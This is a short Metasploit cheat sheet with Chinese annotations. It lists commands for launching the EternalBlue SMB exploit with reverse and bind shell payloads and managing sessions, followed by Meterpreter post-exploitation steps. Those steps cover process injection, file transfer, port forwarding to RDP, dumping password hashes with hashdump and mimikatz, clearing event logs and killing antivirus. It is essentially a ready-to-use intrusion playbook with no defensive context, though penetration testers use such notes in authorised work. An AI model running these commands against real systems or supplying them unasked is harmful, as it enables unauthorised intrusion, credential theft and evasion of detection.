# METASPLOIT

### 1、启动

```
service postgresql start
msfdb init
msfconsole
```

### 2、基础使用

```
help
search ms17-010
back 
use exploit/windows/smb/ms17_010_eternalblue
use exploit/multi/handler //常用的侦听端口方式
info //查看EXP信息
show options
show encode //进行编码
show payloads
set rhost 1.1.1.1
set payload windows/x64/meterpreter/reverse_tcp;windows/x64/shell/bind_tcp;
windows/x64/shell/reverse_tcp //几种常用的payload
unset
run
exploit -j //后台创建连接
sessions -l //查看后台的会话
sessions -i 1 //进入会话
```

### 3、meterpreter

```
help
background //后台运行，到msf主界面
shell
getwd
getuid
cd c:\\
ps
migrate 1467 //注入进程
upload .bash_history c:\\
download c:\\users\\desktop.ini
execute -f cmd.exe -i -H
portfwd  add  -l 1122 -p 3389 -r 1.1.1.1 //端口转发
hashdump
run post/windows/gather/smart_hashdump //hashdump出错，可以使用这个
load mimikatz; 
clearev
run killav  //关闭杀毒软件
```

